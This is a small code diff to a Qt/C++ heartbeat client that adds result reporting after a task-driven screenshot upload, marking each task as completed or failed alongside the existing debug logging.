@@ -594,8 +594,10 @@ void Heartbeat::performScreenshot(const QString& taskId) {
         connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
             if (reply->error() == QNetworkReply::NoError) {
                 Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload success: " + taskId);
+                uploadResult(taskId, "Screenshot uploaded successfully", "completed");
             } else {
                 Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload failed: " + reply->errorString());
+                uploadResult(taskId, "Screenshot upload failed: " + reply->errorString(), "failed");
             }
             reply->deleteLater();
             QFile::remove(tempPath);
